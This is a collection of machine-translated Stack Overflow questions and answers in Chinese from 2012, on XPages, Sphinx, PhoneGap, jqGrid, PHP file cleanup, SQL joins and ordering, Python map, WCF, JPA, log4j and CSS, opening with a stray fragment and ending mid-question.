您只能在越狱设备上使用应用商店或分发。

没有其他办法。

# http - Xpages HTTP Web 服务器：命令未处理异常 HTTP 代码：500

> ID：13271653
> 
> 赞同：0
> 
> 时间：2012-11-07T14:22:53.360
> 
> 标签：http, xpages, lotus

## 问题

我有一个 Xpage 在测试 Domino 服务器上正常工作。在生产 Domino 服务器上无法打开，显示**Http 500**错误。

两台服务器在服务器文档中具有不同的访问控制设置，但应用程序（生产服务器）的签名者在除“签署脚本库以代表其他人运行”字段之外的所有可编程性限制字段中列出。

## 服务器日志

> [25A4:0014-1604] 2012.11.07 14:06:30 HTTP JVM：严重：CLFAD0141E：处理 XPage 请求时出错
> 
> [25A4:0014-1604] 2012.11.07 14:06:30 HTTP JVM：严重：CLFAD0211E：抛出异常 [25A4:0014-1604] 2012.11.07 14:06:30 HTTP JVM：严重：CLFAD0246E：服务请求发生异常对于：/applications/application.nsf/xpage.xsp - HTTP 代码：500
> 
> [25A4:0014-1604] 2012.11.07 14:06:30 HTTP Web 服务器：命令未处理异常 [/applications/application.nsf/xpage.xsp] CN=First Last/O=Company/C=Country Code

## 问题

我已经搜索了包括 IBM 页面和论坛在内的网络，以寻找可能修复此错误的方法，但我还没有找到可用的解决方案。有谁现在如何解决这个错误？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-07T14:32:42.350

查看服务器上 data/IBM_TECHNICAL_SUPPORT 文件夹中最新的 xpages_exc_*.log 文件，以获取有关错误的更详细说明。

如果您无权访问服务器上的文件系统，请安装并使用[OpenNTF 中的 XPages 日志文件阅读器，](http://www.openntf.org/internal/home.nsf/project.xsp?action=openDocument&name=XPages%20Log%20File%20Reader)以便轻松访问服务器日志文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T18:05:53.187

本周早些时候，我在生产 8.5.1 服务器（没有 extlib）上也遇到了这个问题，通过重新启动 Domino 服务器解决了这个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T15:07:56.100

除了服务器安全设置等问题还可能与应用程序特定设置有关。例如。全文索引、数据库属性等。比较这些东西也可能是个好主意。此外，我还建议使用日志阅读器来轻松访问 XPages 日志文件...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-28T14:49:33.600

[在这里，我找到了解决相同问题的方法](https://stackoverflow.com/questions/29925391/error-500-command-not-handled-exception-on-all-xpages/30111814#30111814?newreg=e8dc72f35a464a49b708405aee81b38c)

" 解决方法被发现了！我们在 C:\Lotus\Domino\jvm\lib\ext 目录中添加了一些 Crystal Reports jar 文件。看起来 Domino 和 XPages 不喜欢那样。相反，我们不得不将它们放入Domino 外部的目录，然后需要在 notes.ini 的“JavaUserClassesExt”行中引用这些 jar 文件。完成后，Xpages 工作！”

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-11-13T21:33:33.547

当我在 Xpage 属性窗口的页面生成属性部分中包含 extlib.relational.library 和 extlibx.library 时，我遇到了同样的错误。如果我取消选中关系库，它工作正常。

# php - 狮身人面像搜索 sql_attr_multi - where 条件

> ID：13271656
> 
> 赞同：0
> 
> 时间：2012-11-07T14:22:59.560
> 
> 标签：php, mysql, search, sphinx

我需要设置一个索引。

sql_attr_multi = 来自查询的 uint 类别；SELECT item_id, category_id FROM 连接 WHERE value=2

如果我将值设置为静态，它工作正常。

该值是一个变量，所以我想通过过滤器分配它，但它不起作用，因为我想过滤“sql_attr_multi”而不是 $sql。

$cl->setFilter("值", array(2));

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:53:37.307

setFilter 只与搜索有关（ searchd 过程）。它是应用于属性的过滤器。不能根据条件更改类别 sql_attr_multi 属性值（除非您重新索引或使用 updateAttributes）。如果值变化不大，则为每个值创建一个 mva 属性。

# android - 如何在新层中打开带有 phonegap 的外部链接？

> ID：13271658
> 
> 赞同：0
> 
> 时间：2012-11-07T14:23:01.433
> 
> 标签：android, iphone, ios, cordova, webview

我正在使用 Phonegap 创建一个 iphone/android 应用程序。

当用户单击外部链接时，电话会打开默认浏览器并在其中打开链接。

在某些应用程序中，虽然我已经看到可以打开一个在应用程序内向上滑动（从下到上）的层，并显示该层中链接所指的网站（见屏幕截图）。在底部，两个按钮显示“关闭”和“在 Safari 中打开”。

**有没有办法对 Phonegap 做同样的事情？**

* * *

![在此处输入图像描述](../Images/caa115ab2a23511f5933059b77451683.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:38:00.417

该[`ChildBrowser`](https://github.com/purplecabbage/phonegap-plugins/tree/master/iOS/ChildBrowser)插件完全符合您的要求。

# javascript - JQGrid 数据未使用 xml 加载

> ID：13271660
> 
> 赞同：1
> 
> 时间：2012-11-07T14:23:10.557
> 
> 标签：javascript, jquery, xml, jqgrid

我已经看到了类似问题的答案，但它无济于事。正在显示网格，甚至正在传递数据，但唯一的问题是它没有在 jqGrid 中加载。我检查了浏览器中的响应，数据以 XML 格式发送。所以，唯一的问题是它没有在浏览器中显示。

```
var lastsel2;
            $(function(){ 
                  $("#list1").jqGrid({
                    //url:'process/roles/GetRoles1.php',
                    url: 'processDragonDisplay.php',
                    datatype: 'xml',
                    mtype: 'GET',
                    autowidth: true,
                    height: 'auto',

                    colNames:['name', 'body', 'active_flag','Action'],
                    colModel :[
                      {name:'name', index:'name',   search:true, sortable: true}
                      ,{name:'body', index:'body',  search:true, sortable: true}
                      ,{name:'active_flag', index:'active_flag', width:30, sortable: true}
                      ,{name: 'choice', index: 'choice',width: 50, sortable: false }

                    ],
                    pager: '#pager1',
                    rowNum:10,
                    rowList:[10,20,30],
                    sortname: 'name',
                    sortorder: 'asc',
                    viewrecords: true,
                    gridview: true,
                    caption: 'Templates',
                    editurl: 'processDragonDisplay.php',
                    onSelectRow: function(id) {
                        $('#rowID').html(id);
                        //$('#userId123').attr('value', id);
                        $('#list2').trigger("reloadGrid");
                        if(id && id!==lastsel2){
                            jQuery('#list1').restoreRow(lastsel2);
                            jQuery('#list1').editRow(id,true);
                              lastsel2=id;
                        }
                    },
                    loadComplete: function(){ 
                        var ids = jQuery("#list1").getDataIDs();
                        for(var i=0;i<ids.length;i++){ 
                            var cl = ids[i];
                            ce = "<span class='ui-icon ui-icon-pencil' onclick=editData('"+cl+"');></span>"; 
                            $("#list1").jqGrid('setRowData', ids[i] , { choice: ce });
                        }
                    }
                  }).navGrid("#pager1",{edit:false, add:false, del:true});
                  //$("#list1").jqGrid('inlineNav','#pager1', {edit:false, del: false, add: false});
                }); 
```

带有 XML 数据的响应：

```
<?xml version='1.0' encoding='utf-8'?><rows><page>1</page><total>1</total><records>7</records><row id='A-000002'><cell>foo</cell><cell>bar yes ok</cell><cell>Y</cell><cell></cell></row><row id='A-000009'><cell>hello</cell><cell>hwq</cell><cell>Y</cell><cell></cell></row><row id='A-000013'><cell>nnnnn</cell><cell>nnnn</cell><cell>n</cell><cell></cell></row><row id='A-000007'><cell>t1</cell><cell>Your appointment for TOken  at  for  will be at </cell><cell>Y</cell><cell></cell></row><row id='A-000008'><cell>t1</cell><cell>Your appointment for TOken  at for  will be at </cell><cell>Y</cell><cell></cell></row><row id='A-000011'><cell>test2</cell><cell>test2</cell><cell>n</cell><cell></cell></row><row id='A-000015'><cell>wwwww</cell><cell>wwwww</cell><cell>g</cell><cell></cell></row></rows> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-09T06:29:37.443

您的 XML 数据格式无效。查看[wiki](http://www.trirand.com/jqgridwiki/doku.php?id=wiki%3aretrieving_data)中的一些示例。您必须使用 xmlReader 将 XML 数据映射到网格。

例如：

```
xmlReader: { root:"result", row:"invoice"  } 
```

将是到以下数据格式的映射：

```
<invoices> 
   <request>true</request> 
   ... 
   <result> 
      <invoice> 
         <cell>data1</cell> 
         <cell>data2</cell> 
         <cell>data3</cell> 
         <cell>data4</cell> 
         <cell>data5</cell> 
         <cell>data6</cell> 
      </invoice> 
      ... 
   </result> 
</invoices> 
```

# php - 使用 glob php 从目录中删除除一种文件类型之外的所有文件类型

> ID：13271663
> 
> 赞同：1
> 
> 时间：2012-11-07T14:23:18.640
> 
> 标签：php

> **可能重复：**
> [glob() 有否定吗？](https://stackoverflow.com/questions/1877524/does-glob-have-negation)

我想从目录中删除所有文件（可以是任意数量的文件扩展名），除了其中的单个 index.html 。

我在用着：

```
$path = "/assets/cache/";

foreach(glob($path ."*.*") as $file) {
    unlink($file);
} 
```

但不能为我的生活怎么说取消链接，如果不是.html！

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:27:54.180

尝试

```
$path = "/assets/cache/";

foreach(glob($path ."*.*") as $file) {
    if(pathinfo($file, PATHINFO_EXTENSION) != 'html') {
        unlink($file);
    }
} 
```

如果您还想删除其他 html 文件（“index.html”除外）：

```
$path = "/assets/cache/";

foreach(glob($path ."*.*") as $file) {
    if(pathinfo($file, PATHINFO_BASENAME) != 'index.html') {
        unlink($file);
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:27:12.760

在这里试试这个...

```
$path = "/assets/cache/";

foreach(glob($path ."*.*") as $file) {
    $pathPart = explode(".",$file);
    $fileEx = $pathPart[count($pathPart)-1];
    if($fileEx != "html" && $fileEx != "htm"){
        unlink($file);
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T16:03:37.007

php 函数[`glob`](http://php.net/glob)没有否定，但是 PHP 可以通过以下方式为您提供两个 glob 之间的区别[`array_diff`](http://php.net/array_diff)：

```
$all = glob("*.*");
$not = glob("php_errors.log");

var_dump(
    $all, 
    $not, 
    array_diff($all, $not)
); 
```

查看演示：[http ://codepad.org/RBFwPUWm](http://codepad.org/RBFwPUWm)

如果您不想使用数组，我强烈建议您查看 PHPs 目录迭代器。

# java - 我必须将 SQL 语句中的哪个通配符用于 Access *.mdb 文件查询（使用 Java 和 JDBC：ODBC 桥）

> ID：13271665
> 
> 赞同：1
> 
> 时间：2012-11-07T14:23:26.370
> 
> 标签：java, ms-access, jdbc

我尝试执行以下 SQL 语句（在我的 Java 应用程序中）：

```
SELECT * FROM Tbl_Job WHERE jobname LIKE '%aa%'; 
```

但我无法使用 MS Access (2002) 获得相同的（正确的？）结果：

```
SELECT * FROM Tbl_Job WHERE jobname LIKE '*aa*'; 
```

在这个例子中，Access 会给我 400 个数据集，而我的 Java 应用程序只会给我更少的数据，我不知道数据集的确切数量。

我尝试在我的 Java 应用程序中使用 [*]-wildcard，但它根本没有给我任何数据集。此外，我尝试用 ["] 字符替换 ['] 字符，但这也不起作用。

我不知道这是否相关，但我认为 *.mdb 文件是使用 MS Access (2000) 创建的

我的Java代码：

```
Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
Connection connection = DriverManager.getConnection("jdbc:odbc:_
                        Driver={Microsoft Access Driver_
                        (*.mdb)};DBQ=C:\database.mdb");
Statement stm = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
                ResultSet.CONCUR_READ_ONLY);
ResultSet rs = stm.executeQuery(sql);
while(rs.next())
    do_some_stuff(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:46:30.977

建议您从 Java 和直接在 Access 中尝试此 SQL 语句。

```
SELECT Count(*) AS num_rows FROM Tbl_Job WHERE jobname ALike '%aa%'; 
```

如果`num_rows`在两种情况下都相同，请更改第一个查询中的 WHERE 子句以匹配这个。

如果`num_rows`在两种情况下都不相同，请描述它们的不同之处以及哪些是正确的。

# cocos2d-iphone - CocosDenshion - 我一直看到抛出异常

> ID：13271666
> 
> 赞同：5
> 
> 时间：2012-11-07T14:23:27.423
> 
> 标签：cocos2d-iphone

我们在游戏中使用 CocosDenshion。当我们在 xcode 中打开异常断点时，我们不断地从

status = ExtAudioFileSetProperty(extRef, kExtAudioFileProperty_ClientDataFormat, sizeof(theOutputFormat), &theOutputFormat);

在 CDOpenALSupport.m 中

（请注意，这个异常不会导致游戏崩溃，因为它被 CocosDenshion 捕获，但我们仍然想看看我们是否可以阻止这些异常）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-07T21:08:59.220

设置异常断点以仅处理 Objective-C 异常。这可以防止这些 Cocosdenshion 异常被断点捕获。

我敢打赌他们没什么好担心的，从我记事起就一直这样。

# mysql - MySQL按多列排序，同时按一分组

> ID：13271667
> 
> 赞同：0
> 
> 时间：2012-11-07T14:23:28.187
> 
> 标签：mysql, sql, sql-order-by

所以我有一个奇怪的场景，我希望以某种方式对以下数据进行排序。设表数据为：

```
abc 111 2     priority
abc 111 blah  data
abc 222 1     priority
abc 222 blah  data
abc 333 3     priority
abc 333 blah  data 
```

我想根据第三列（其中第 4 列是优先级）对数据进行排序，但保留按第 2 列分组的返回顺序。因此，预期的查询结果如下所示：

```
abc 222 1     priority
abc 222 blah  data
abc 111 2     priority
abc 111 blah  data
abc 333 3     priority
abc 333 blah  data 
```

这样做的最佳方法是什么。我可以考虑预先做一个查询和一个 in 子句，但是我必须考虑所有可能的优先级。

提前致谢。仅供参考，我正在使用它的 MySQL。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T15:12:46.660

我认为这是你需要的：

[http://sqlfiddle.com/#!2/48057/14](http://sqlfiddle.com/#!2/48057/14)

**DDL**

```
CREATE TABLE my_data( 
  name VARCHAR(20),
  num NUMERIC(5), 
  c NUMERIC(3),
  priority NUMERIC(3)
); 
```

**DML**

```
INSERT INTO my_data VALUES("abc", 111, 2, 1);
INSERT INTO my_data VALUES("abc", 222, 3, 4);
INSERT INTO my_data VALUES("abc", 222, 1, 9);
INSERT INTO my_data VALUES("abc", 111, 4, 2); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T17:07:12.223

如果您实际上可以包含实际的列名，即使是伪造的数据也会更好，但是，我已经将它们命名为与我认为您正在呈现的内容类型相对应。

看来您的第二列是一些“ID”列，并且希望将它们全部组合在一起。因此，按您想要的顺序预查询，但仅针对“优先级”列，忽略其余记录。然后，使用 MySQL 变量，您可以为最终输出分配一个顺序值。然后加入所有其他值的“ID”列上的常规数据......就像......

```
select
      md2.ABCColumn,
      SortSeqQuery.IDColumn,
      md2.DescripColumn,
      md2.ColumnWith123Sequence
   from
      my_Data md2
         LEFT JOIN ( select 
                           md1.IDColumn,
                           @SeqVal := @SeqVal +1 as FinalSortOrder
                        from
                           my_Data md1,
                           ( select @SeqVal := 0 ) sqlvars
                        where
                           md1.DescripColumn = "priority"
                        order by
                           md1.ColumnWith123Sequence,
                           md1.IDColumn ) SortSeqQuery
            on md2.IDColumn = SortSeqQuery.IDColumn 
   order by
      case when SortSeqQuery.IDColumn is null then 2 else 1 end,
      coalesce( SortSeqQuery.FinalSortOrder, 0 ) as FinalSort 
```

使用“Order By”，它在实际应用@SeqVal 之前对合格数据进行预排序，而@SeqVal 又应以1、2、3、4 等形式返回...

“SortSeqQuery”将首先运行以对任何“优先级”记录进行预限定，并将它们排序并可用。然后，您的“my_data”表是查询的基础，并加入该结果集并根据匹配的 ID 列获取适当的排序序列。如果有没有优先级的 IDColumn 条目，那么它们也将被包括在内，但是基于 case/when 的 order by，任何为 null 的条目都预先排序到底部，找到的条目将被排序到最佳。在该排序中，它将所有 IDColumn 条目分组在一起，因为相同的“FinalSortOrder”直接关联到初步查询中的 IDColumn。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T14:38:40.693

回答 -

```
CREATE TABLE my_data( name VARCHAR(20),groupid INT(5), attributekey VARCHAR(10),attributevalue VARCHAR(10));

INSERT INTO my_data VALUES("abc", 111, "priority", "2");
INSERT INTO my_data VALUES("abc", 111, "someattr", "blah");
INSERT INTO my_data VALUES("abc", 222, "priority", "1");
INSERT INTO my_data VALUES("abc", 222, "someattr", "blah");
INSERT INTO my_data VALUES("abc", 333, "priority", "3");
INSERT INTO my_data VALUES("abc", 333, "someattr", "blah"); 
```

解决方案 -

```
SELECT m1.*,
(select attributevalue from my_data m2
   where m1.groupid=m2.groupid 
   AND m2.attributekey='priority' 
) groupidpriority 
FROM my_data m1
order by groupidpriority; 
```

# python - Ruby 和 Javascript 中 map 的 Python 等价物是什么？

> ID：13271670
> 
> 赞同：9
> 
> 时间：2012-11-07T14:23:51.510
> 
> 标签：python, list, map

例如说我想分割字符串`"12:30-14:40"`并将结果放在一个矩阵中，如：`[["12","30"],["14","40"]]`。

我可以在 JavaScript 中做到这一点：

```
"12:30-14:40".split("-").map(function(x) {
    return x.split(':');
}); 
```

在 Ruby 中：

```
 "12:30-14:40".split("-").map{|x| x.split(":")} 
```

上面的python等价物是什么？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-07T14:28:42.230

在 Python 中并使用[`map()`](https://docs.python.org/3/library/functions.html#map)你会得到类似的东西：

```
In [1]: map(lambda x: x.split(":"), "12:30-14:40".split("-"))
Out[1]: [['12', '30'], ['14', '40']] 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-11-07T14:27:50.187

您可以使用列表推导：

```
>>> [i.split(':') for i in "12:30-14:40".split('-')]
[['12', '30'], ['14', '40']] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-10-10T20:08:41.693

以Ruby[和 Python 为例](http://grschafer.com/guides/2013/08/20/ruby-and-python-by-example/)

> ### 红宝石
> 
> ```
> a = [1,2,3]
> a.map { |x| x**2 } # [1,4,9]
> # map returns a new array
> # use map! to mutate the original
> 
> a.collect { |x| x**2 } # [1,4,9]
> # collect is an alias of map 
> ```
> 
> ### Python
> 
> ```
> a = [1,2,3]
> [x**2 for x in a] # [1,4,9]
> map(lambda x: x**2, a) # [1,4,9] 
> ```

如果您希望 python 返回一个列表，就像 ruby​​ 一样：`list(map(lambda x: x**2, a))`

# wcf - WCF - 客户端身份验证方案“匿名”禁止 HTTP 请求

> ID：13271674
> 
> 赞同：1
> 
> 时间：2012-11-07T14:24:01.627
> 
> 标签：wcf, web-services, wcf-security

我知道这是一个非常常见的情况，但经过两天的搜索，我仍然没有找到解决这个问题的方法。

我有一个 WCF 服务和一个客户端（网站），使用 SSL 和客户端证书。

相关服务配置部分：

```
<system.serviceModel>
    <bindings>
        <basicHttpBinding>
            <binding name="HOLBinding">
                <security mode="Transport">
                    <transport clientCredentialType="Certificate" />
                </security>
            </binding>
        </basicHttpBinding>
    </bindings>
    <behaviors>
      <serviceBehaviors>
        <behavior name="HOLServiceBehaviour">
          <serviceCredentials>
            <clientCertificate>
        <authentication certificateValidationMode="PeerOrChainTrust" trustedStoreLocation="LocalMachine" />
        </clientCertificate>
          </serviceCredentials>
          <serviceMetadata httpGetEnabled="false" httpsGetEnabled="false" />
          <serviceDebug includeExceptionDetailInFaults="false" />
        </behavior>
      </serviceBehaviors>
<services>
      <service name="HOL.Core.Service.HOLService" behaviorConfiguration="HOLServiceBehaviour">
        <endpoint address="bh" bindingConfiguration="HOLBinding" binding="basicHttpBinding" contract="HOL.Core.Service.IHOLService" />
        <endpoint address="wb" behaviorConfiguration="WebBehaviour" binding="webHttpBinding" contract="HOL.Core.Service.IHOLService" />
      </service>
    </services> 
```

相关客户端服务配置：

```
<system.serviceModel>
    <behaviors>
      <endpointBehaviors>
        <behavior name="HOLServiceEndpointBehaviour">
          <clientCredentials>
            <clientCertificate storeLocation="LocalMachine" 
                   findValue="mythumbprint" 
                               x509FindType="FindByThumbprint" storeName="TrustedPeople" />

            <serviceCertificate>
               <authentication certificateValidationMode="PeerOrChainTrust"/>
            </serviceCertificate>
          </clientCredentials>
        </behavior>
      </endpointBehaviors>
    </behaviors>
    <bindings>
      <basicHttpBinding>
        <binding name="BasicHttpBinding_IHOLService" maxBufferPoolSize="20000000" maxReceivedMessageSize="20000000">
            <security mode="Transport">
        <transport clientCredentialType="Certificate" />
         </security>
        </binding>
      </basicHttpBinding>
    </bindings>
    <client>
      <endpoint address="https://www.myhttpsite.co.uk/Service/HOLService.svc/bh" binding="basicHttpBinding" 
                bindingConfiguration="BasicHttpBinding_IHOLService" contract="HOLCoreService.IHOLService" 
                name="BasicHttpBinding_IHOLService" behaviorConfiguration="HOLServiceEndpointBehaviour">
    </endpoint>
    </client>
  </system.serviceModel> 
```

我的证书正在被发现，所以这不是问题（我也花了一天时间来解决这个问题！）

我认为错误在于调用 WCF 服务的客户端根本没有发送正确的详细信息进行身份验证......但是为什么呢？

# sql - LEFT JOIN - 即使你有正确的匹配，如何连接表并包含额外的行

> ID：13271676
> 
> 赞同：2
> 
> 时间：2012-11-07T14:24:07.510
> 
> 标签：sql

我有两张桌子

```
Table A
-------
ID
ProductName

Table B
-------
ID
ProductID
Size 
```

我想加入这两个表

```
SELECT * FROM
   (SELECT * FROM A)
   LEFT JOIN
   (SELECT * FROM B)
ON A.ID = B.ProductID 
```

这很简单，我将 A 中的所有行乘以 B 中匹配的行，如果没有匹配，则为 NULL 字段。

但是这里出现了一个棘手的问题，即使存在匹配项，我如何才能从 A 中获取所有具有表 B 的 NULL 字段的行，所以我得到一个带有 NULL 值加上所有匹配项的额外行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:30:46.783

```
SELECT  A.* 
,       B3.ID
,       B3.ProductID
,       B3.Size
FROM    A
LEFT JOIN
        (
        SELECT  ProductID as MatchID
        ,       ID
        ,       ProductID
        ,       Size 
        FROM    B
        UNION ALL
        SELECT  ID
        ,       null
        ,       null
        ,       null
        FROM    A A2
        ) B3
ON      A.ID = B3.MatchID 
```

[SQL Fiddle 上的实时示例。](http://www.sqlfiddle.com/#!2/88d2c/5/0)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:45:39.653

除了`UNION ALL`按照其他人的建议在子查询中使用，您还可以（而且我会）`UNION ALL`在外部级别使用，这使查询更简单：

```
SELECT A.ID, A.ProductName, B.ID, B.Size
FROM A
INNER JOIN B
ON B.ProductID = A.ID
UNION ALL
SELECT A.ID, A.ProductName, NULL, NULL
FROM A 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:35:08.417

由于每次连接都会成功，我们可以切换到完全/内部连接：

```
SELECT
    *
FROM
   A
       INNER JOIN
   (SELECT ID,ProductID,Size FROM B
    UNION ALL
    SELECT NULL,ID,NULL FROM A) B
       ON
          A.ID = B.ProductID 
```

现在是明确切换到命名列的好时机，而不是*使用*`SELECT *`

* * *

或者，如果根据@Andomar 的评论，您需要所有`B`列`NULL`：

```
SELECT
    A.ID,A.ProductName,
    B.ID,B.ProductID,B.Size
FROM
   A
       INNER JOIN
   (SELECT ID,ProductID,Size,ProductID as MatchID FROM B
    UNION ALL
    SELECT NULL,NULL,NULL,ID FROM A) B
       ON
          A.ID = B.MatchID 
```

# mysql - MySQL 优化查询以增强比较报告的性能

> ID：13271678
> 
> 赞同：1
> 
> 时间：2012-11-07T14:24:17.943
> 
> 标签：mysql, database, jsp

我有两个表“ `users`”和“ `temp_users`”。现在，“users”表包含数百万个数据，“temp_users”包含数千个数据。这两个表都包含相同类型的信息，但有时可能会丢失某些记录。

因此，要求是比较这两个表并显示它们之间的差异。我编写了比较查询，但可能是由于数据量巨大（数百万），执行时间超过 5 分钟。有什么建议吗？？

我写的比较查询如下：

```
SELECT 
   id,
   dateTime,
   phone,
   address 
FROM 
   tempUsers t1 
WHERE NOT EXISTS (
   SELECT id,dateTime 
   FROM users t2 
   WHERE t1.id = t2.id 
   OR t1.dateTime=t2.dateTime
) 
```

系统采用JSP和MySQL开发，部署在Apache Tomcat中

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:37:03.620

两个观察：

1.  您真的打算在 where 子句中使用“OR”吗？不应该是“和”吗？如果查询优化器由于“或”逻辑而无法利用索引，则“或”可能会导致查询运行得更慢。
2.  您使用的是子选择而不是 JOIN，这也可能导致称为“相关子查询”的重大问题，其中子选择必须为外部选择返回的每一行执行。

上述两个问题（具有 OR 条件的相关子查询）可能是导致问题的原因。

请尝试以下查询：

```
SELECT 
   t1.id,
   t1.dateTime,
   t1.phone,
   t1.address 
FROM 
   tempUsers t1 
LEFT OUTER JOIN
   users t2
ON
   t1.id = t2.id 
   AND t1.dateTime=t2.dateTime
WHERE
   t2.id IS NULL 
```

上面的查询使用 ID 和 DATETIME 执行“LEFT OUTER JOIN”来连接两个表，然后将结果过滤到仅在 USERS 中没有行的那些。这应该返回你想要的。

如果“OR”条件确实是您需要的逻辑，则在“ON”子句中更改它，但要做好准备，它可能会对查询速度产生不利影响。

为了提高速度：确保“id”、“dateTime”或两者都有索引。

希望这可以帮助！

约翰...

# jpa - 迭代 JPA 查询结果

> ID：13271679
> 
> 赞同：1
> 
> 时间：2012-11-07T14:24:25.830
> 
> 标签：jpa, criteria-api

有没有办法通过 JPA API 来迭代查询结果，类似于 Hibernate 的`Criteria.scroll()`方法？使用大结果集可以大大提高性能，可以在读取行时对其进行处理。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T21:52:30.980

不，JPA 中没有这样的构造。也不在[JPA 2.1](https://download.oracle.com/otn-pub/jcp/persistence-2_1-fr-eval-spec/JavaPersistence.pdf)中。

JPA 2.2 提供了 TypedQuery。[getResultStream()](https://javaee.github.io/javaee-spec/javadocs/)，但默认实现没有预期效果（调用 getResultList）。此外，具体的实现并不总能带来性能改进，如[本文](https://vladmihalcea.com/whats-new-in-jpa-2-2-stream-the-result-of-a-query-execution/)所示。

# log4j - log4j 记录到控制台但不是 File blazeDS

> ID：13271680
> 
> 赞同：2
> 
> 时间：2012-11-07T14:24:26.703
> 
> 标签：log4j, blazeds, apache-commons-logging

我看到使用 log4j 的奇怪行为，我完全被难住了。这是我第一次将它与 BlazeDS 一起使用，我希望这是我错过的一个小问题。

在这个 Web 应用程序中，我使用 log4j 从 2 个 java 类以及 blazeDS 进行日志记录。我通过 org.springframework.flex.core.CommonsLoggingTarget 将 BlazeDS 连接到 commons-logging，然后使用 log4j 作为底层记录器。

我在 blazeds 记录器下为“Console”和“MyFile”设置了附加程序，当控制台输出按预期工作时，没有任何内容写入 MyFile。该文件实际上已创建，但保持在 0KB。另一方面，我的两个 java 类都很好地记录到控制台和它们的滚动文件。我在本地测试和部署到 Tomcat 时都看到了这种行为。

最后一个细节 - 在本地测试时，我将 MyFile 路径更改为绝对路径，并看到该文件已附加到。这会让我相信这是相对路径的问题，但是它在我的 java 日志记录中运行良好。

commons-logging.properties：

```
org.apache.commons.logging.LogFactory=org.apache.commons.logging.impl.LogFactoryImpl
org.apache.commons.logging.Log=org.apache.commons.logging.impl.Log4JLogger 
```

log4j.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration status="trace" debug="true">
  <appenders>
    <Console name="Console" target="SYSTEM_OUT">
      <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
    </Console>

    <RollingFile name="RollingFile" fileName="logs/ImpactTradeQuery.log"
                                    filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz">
      <PatternLayout>
        <pattern>%d %p %C{1.} [%t] %m%n</pattern>
      </PatternLayout>
      <Policies>
        <TimeBasedTriggeringPolicy />
        <SizeBasedTriggeringPolicy size="25 MB"/>
      </Policies>
      <DefaultRolloverStrategy max="25"/>
    </RollingFile>

    <File name="MyFile" immediateFlush="true" fileName="logs/app.log">
      <PatternLayout>
        <pattern>%d %p %C{1.} [%t] %m%n</pattern>
      </PatternLayout>
    </File>
  </appenders>
  <loggers>
    <root level="trace">
        <appender-ref ref="Console"/>
    </root>
    <logger name="flex.samples.trade.tradeService" level="trace" additivity="False">
        <appender-ref ref="RollingFile"/>
        <appender-ref ref="Console"/>
    </logger>
    <logger name="flex.samples.ConnectionHelper" level="trace" additivity="False">
        <appender-ref ref="RollingFile"/>
        <appender-ref ref="Console"/>
    </logger>
    <logger name="blazeds" level="trace" additivity="True">
        <appender-ref ref="MyFile"/>
        <appender-ref ref="Console"/>
    </logger>
    </loggers>
</configuration> 
```

服务-config.xml：

```
<logging>
        <target class="flex.messaging.log.ConsoleTarget" level="Error">
            <properties>
                <prefix>[BlazeDS] </prefix>
                <includeDate>false</includeDate>
                <includeTime>false</includeTime>
                <includeLevel>false</includeLevel>
                <includeCategory>false</includeCategory>
            </properties>
            <filters>
                <pattern>Endpoint.*</pattern>
                <pattern>Service.*</pattern>
                <pattern>Configuration</pattern>
            </filters>
        </target>
        <target class="org.springframework.flex.core.CommonsLoggingTarget" level="All">
            <properties>
                <categoryPrefix>blazeds</categoryPrefix>
            </properties>
            <filters>
                <pattern>Endpoint.*</pattern>
                <pattern>Service.*</pattern>
                <pattern>Configuration</pattern>
            </filters>
        </target>
    </logging> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T18:58:18.607

原来是Tomcat（log4j-jcl）中丢失的jar文件导致了这个问题。一旦库与应用程序正确打包，日志记录就会按预期工作。

# html - 删除嵌套 div 中的链接 uderline

> ID：13271681
> 
> 赞同：0
> 
> 时间：2012-11-07T14:24:32.407
> 
> 标签：html, css

我开始学习html'n'css，但是遇到了一件我无法解释的事情。我有一个 html 文件，它有一个类似于链接的 div（在应用程序中，我正在设置 div 大小并希望整个框像链接一样）。我无法删除 div 中文本的文本下划线装饰（示例中的 Link1 始终带下划线）。选择器应该是“链接元素中的任何 div”，因为链接是红色的，我认为它是正确的。

我设法通过引入一个用于显式删除下划线的特殊类来做到这一点（示例中的 Link2 可以），但我希望将所有菜单样式放在一个地方。

问题是，是否有人可以解释为什么像这样的删除装饰（Link1）不起作用。此外，我想问一下菜单的组织是否是一种好的风格，或者我是否应该重新组织代码，例如：有这个例如：

```
<a href="index.html" class="menuitem"><div>Blabla</div></a> 
```

和风格：

```
a.menuitem {...}
a.menuitem div {width:...;} 
```

